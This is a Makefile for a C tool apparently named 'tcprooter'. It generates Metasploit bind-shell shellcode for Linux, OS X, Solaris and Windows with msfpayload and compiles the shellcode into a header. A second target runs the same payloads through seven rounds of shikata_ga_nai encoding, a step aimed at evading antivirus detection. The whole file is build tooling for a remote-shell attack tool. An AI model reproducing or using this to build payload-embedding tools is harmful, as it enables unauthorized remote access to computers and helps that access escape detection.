CC	=	gcc -g
INC	=	tcprooter.h msfpayload.h
SRC	=	tcprooter.c
OBJ	=	tcprooter.o
BIN	=	tcprooter

$(BIN): $(OBJ)
$(OBJ): $(SRC) $(INC)

clean:
	rm -f $(OBJ) $(BIN) msfpayload.h msfpayload_enc.h

msfpayload.h:
	echo "#define PAYLOADS 5" >$@
	msfpayload linux/x86/shell_bind_tcp c | sed -e 's/ buf/ linux_x86_shell_bind_tcp/' >>$@
	msfpayload osx/x86/shell_bind_tcp c | sed -e 's/ buf/ osx_x86_shell_bind_tcp/' >>$@
	msfpayload solaris/x86/shell_bind_tcp c | sed -e 's/ buf/ solaris_x86_shell_bind_tcp/' >>$@
	msfpayload windows/shell_bind_tcp c | sed -e 's/ buf/ windows_shell_bind_tcp/' >>$@
	msfpayload windows/x64/shell_bind_tcp c | sed -e 's/ buf/ windows_x64_shell_bind_tcp/' >>$@

msfpayload_enc.h:
	echo "#define PAYLOADS 5" >$@
	msfpayload linux/x86/shell_bind_tcp r | msfencode -e x86/shikata_ga_nai -t c -c 7 | sed -e 's/ buf/ enc_linux_x86_shell_bind_tcp/' >>$@
	msfpayload osx/x86/shell_bind_tcp r | msfencode -e x86/shikata_ga_nai -t c -c 7 | sed -e 's/ buf/ enc_osx_x86_shell_bind_tcp/' >>$@
	msfpayload solaris/x86/shell_bind_tcp r | msfencode -e x86/shikata_ga_nai -t c -c 7 | sed -e 's/ buf/ enc_solaris_x86_shell_bind_tcp/' >>$@
	msfpayload windows/shell_bind_tcp r | msfencode -e x86/shikata_ga_nai -t c -c 7 | sed -e 's/ buf/ enc_windows_shell_bind_tcp/' >>$@

tarball:
	tar -cvf tcprooter.tar $(SRC) $(INC)


